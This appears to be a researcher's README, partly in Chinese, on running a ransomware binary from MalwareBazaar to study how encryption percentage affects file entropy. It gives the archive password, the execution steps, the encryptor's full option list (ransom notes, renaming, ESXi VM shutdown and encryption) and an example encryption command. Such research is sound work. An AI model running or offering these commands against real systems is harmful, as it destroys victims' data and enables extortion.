## how to use

  Unzip Password : infected  
 
  then run :
`chmod +x filename`

`./filename -h` get help:

                Usage: ./66f86812a6593cdd760cd2119f8bf1a76f33a1b56ab099edc02de7b0629ea15d.elf [arguments]... [path1] [path2]...

                Arguments:
                -c[+/-]               - Change file name after encryption
                -w[+/-]               - Write note in each folder
                -p=count              - Percent of encryption (1..100)
                -e="newextension"     - custom Extension
                -x="externalnote.txt" - include note from eXternal file
                -e, --esxi            - automatic processing of ESXi: shutdown and encryption each machine
                -i=id, -i=id1,id2,... - Ignore vmid(s) (use with '-e' or '--esxi' keys;
                                        run 'vim-cmd vmsvc/getallvm' on ESXi-host to get vmids)
                -d, --daemon          - work as Daemon in background mode
                -l, --log             - write Log (in daemon mode, logging is enabled by default)
                -h, --help            - this Help

                Example:
                ./66f86812a6593cdd760cd2119f8bf1a76f33a1b56ab099edc02de7b0629ea15d.elf -e -i=999,666 -z- -c+ -w+ -p=5 -e="BEASTWASHERE" -x="README.TXT" /SOME/KIND/OF/FOLDER


建议不使用-e和-i，可能会报错vim-cmd is not available

"-e, --esxi: 可能是用于自动处理ESXi的参数，包括关闭并加密每台虚拟机。

-i=id, -i=id1,id2,...: 可能是用于忽略指定虚拟机id的参数，通常与-e或--esxi一起使用。"

如：

`./66f86812a6593cdd760cd2119f8bf1a76f33a1b56ab099edc02de7b0629ea15d.elf -z- -c+ -w+ -p=5 -e=“BEASTWASHERE” -x=“README.TXT” /home/lt/Downloads/randomware-master
`

其中-p 为加密百分比，或许可以更改p的值来获得多个数据，看看对熵的影响


malware get from https://bazaar.abuse.ch/sample/031971b9ccb57c1a7cf25bbd58533a6b1b1e760b2f080cb2be5e2522c0d90053/